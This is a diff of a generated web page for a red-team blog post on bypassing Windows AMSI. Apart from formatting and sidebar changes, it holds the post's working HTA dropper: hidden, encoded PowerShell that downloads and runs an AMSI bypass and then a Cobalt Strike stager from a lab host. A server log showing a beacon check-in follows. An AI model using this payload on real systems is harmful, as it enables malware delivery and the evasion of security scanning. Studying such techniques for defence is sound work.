@@ -21,7 +21,7 @@
     
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="generator" content="Hugo 0.55.6">
+    <meta name="generator" content="Hugo 0.56.0">
     <meta name="theme" content="Tranquilpeak 0.3.1-BETA">
     <title>AmsiScanBuffer Bypass - Part 2</title>
     <meta name="author" content="Rasta Mouse">
@@ -358,14 +358,14 @@ if (!doNotTrack) {
 <p>The final HTA is nice and small.</p>
 
 <pre><code>&lt;script language=&quot;VBScript&quot;&gt;
-    Function var_func()
-        Dim var_shell
-        Set var_shell = CreateObject(&quot;Wscript.Shell&quot;)
-        var_shell.run &quot;powershell.exe -nop -w 1 -enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgAxADQALgAxADIAOQAvAGEAbQBzAGkALQBiAHkAcABhAHMAcwAiACkAKQA7ACAAaQBmACgAWwBCAHkAcABhAHMAcwAuAEEATQBTAEkAXQA6ADoARABpAHMAYQBiAGwAZQAoACkAIAAtAGUAcQAgACIAMAAiACkAIAB7ACAAaQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgAxADQALgAxADIAOQAvAHMAdABhAGcAZQByACIAKQApACAAfQA=&quot;, 0, true
-    End Function
+	Function var_func()
+		Dim var_shell
+		Set var_shell = CreateObject(&quot;Wscript.Shell&quot;)
+		var_shell.run &quot;powershell.exe -nop -w 1 -enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgAxADQALgAxADIAOQAvAGEAbQBzAGkALQBiAHkAcABhAHMAcwAiACkAKQA7ACAAaQBmACgAWwBCAHkAcABhAHMAcwAuAEEATQBTAEkAXQA6ADoARABpAHMAYQBiAGwAZQAoACkAIAAtAGUAcQAgACIAMAAiACkAIAB7ACAAaQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgAxADQALgAxADIAOQAvAHMAdABhAGcAZQByACIAKQApACAAfQA=&quot;, 0, true
+	End Function
 
-    var_func
-    self.close
+	var_func
+	self.close
 &lt;/script&gt;
 </code></pre>
 
@@ -381,24 +381,25 @@ if (!doNotTrack) {
 <ol>
 <li>AMSI download</li>
 <li>Stager download</li>
-<li>Beacon checkin</li>
-</ol>
+
+<li><p>Beacon checkin</p>
 
 <pre><code class="language-text">10/31 11:22:44 visit from: 192.168.214.1
-    Request: GET /amsi-bypass
-    page Serves /opt/cobaltstrike/uploads/AMSIBypass.ps1
-    null
+	Request: GET /amsi-bypass
+	page Serves /opt/cobaltstrike/uploads/AMSIBypass.ps1
+	null
 
 10/31 11:22:44 visit from: 192.168.214.1
-    Request: GET /stager
-    page Serves /opt/cobaltstrike/uploads/stager.ps1
-    null
+	Request: GET /stager
+	page Serves /opt/cobaltstrike/uploads/stager.ps1
+	null
 
 10/31 11:22:44 visit from: 192.168.214.1
-    Request: GET /__init.gif
-    beacon beacon stager x64
-    Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)
-</code></pre>
+	Request: GET /__init.gif
+	beacon beacon stager x64
+	Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)
+</code></pre></li>
+</ol>
 
 <p>Awesome sauce.  And for those who want it, I also uploaded the code to <a href="https://github.com/rasta-mouse/AmsiScanBufferBypass">GitHub</a>.</p>
               
@@ -639,12 +640,29 @@ if (!doNotTrack) {
           <div class="media">
             
             <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2019/08/covenant-donut-tikitorch/">
+                <h3 class="media-heading">Covenant, Donut, TikiTorch</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Aug 8, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>Covenant <a href="https://github.com/cobbr/Covenant/commit/bde0df315f26b01a4ef5c5c00679b1e150998a35">v0.1</a> was first released in February 2019 and has since received a lot of really good updates.  <a href="https://github.com/cobbr/Covenant/commit/a2df643e01aea3ad7330bdba88ddd560692e46b4">v0.2</a> was released in May which added p2p comms over SMB named pipes, and <a href="https://github.com/cobbr/Covenant/commit/abcba78006c29b687f6e1a43a1ea1793784714fd">v0.3</a> was released in August which added a brand new web interface.  Even though it&rsquo;s such a young project, it has really proven itself to be a capable tool for offensive operators.  I&rsquo;ve not taken a look at Covenant since v0.1.x but since providing some new <a href="https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Persistence/WMI.cs">additions</a> to SharpSploit, it kinda got my geek going.  One of my areas of interest is weaponising the Grunt stager.</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
               <a class="link-unstyled" href="https://rastamouse.me/post/">
                 <h3 class="media-heading">Posts</h3>
               </a>
               <span class="media-meta">
                 <span class="media-date text-small">
-                  Jun 6, 2019
+                  Aug 8, 2019
                 </span>
               </span>
               <div class="media-content hide-xs font-merryweather"></div>
@@ -791,23 +809,6 @@ if (!doNotTrack) {
             <hr>
           </div>
         
-          <div class="media">
-            
-            <div class="media-body">
-              <a class="link-unstyled" href="https://rastamouse.me/2019/01/gpo-abuse-part-1/">
-                <h3 class="media-heading">GPO Abuse - Part 1</h3>
-              </a>
-              <span class="media-meta">
-                <span class="media-date text-small">
-                  Jan 1, 2019
-                </span>
-              </span>
-              <div class="media-content hide-xs font-merryweather"><p>Group Policy Objects (GPOs) is a subject I&rsquo;ve wanted to write about for a long time and I&rsquo;m happy to have <em>finally</em> started.</p></div>
-            </div>
-            <div style="clear:both;"></div>
-            <hr>
-          </div>
-        
       </div>
     </div>
     <div class="modal-footer">
@@ -815,7 +816,7 @@ if (!doNotTrack) {
          data-message-zero="no post found"
          data-message-one="1 post found"
          data-message-other="{n} posts found">
-         31 posts found
+         32 posts found
       </p>
     </div>
   </div>
